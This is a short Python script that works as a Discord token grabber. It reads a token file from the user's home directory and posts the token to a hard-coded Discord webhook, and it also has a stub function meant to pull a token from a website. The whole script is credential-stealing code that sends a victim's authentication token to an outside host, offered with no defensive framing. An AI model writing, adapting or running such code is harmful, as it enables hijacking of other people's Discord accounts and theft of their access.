import requests
import os
import json

# Replace with your webhook URL
webhook_url = 'https://discord.com/api/webhooks/1343679739180613652/Hda-bTxbe3FiUiSvNLP4fSaUq7CK73qH3jQGJn1QqZJC_IGudIhkcAUau6G9YS55Zqo1'

# Function to grab the Discord token from the official Discord site
def grab_token_from_discord():
    token_path = os.path.expanduser('~/.config/discord/Token')
    if os.path.exists(token_path):
        with open(token_path, 'r') as file:
            token = file.read().strip()
            return token
    return None

# Function to grab the Discord token from a website
def grab_token_from_website():
    # This is a placeholder function. You need to implement the logic to grab the token from the website.
    # For example, you might need to scrape the website or use a specific API.
    token = "website_token_example"
    return token

# Function to send the token to the webhook
def send_token(token, source):
    payload = {
        "content": f"Discord Token from {source}: {token}"
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    if response.status_code == 204:
        print("Token sent successfully")
    else:
        print("Failed to send token")

# Main function
def main():
    discord_token = grab_token_from_discord()
    if discord_token:
        send_token(discord_token, "official Discord site")

    website_token = grab_token_from_website()
    if website_token:
        send_token(website_token, "website")

if __name__ == "__main__":
    main()
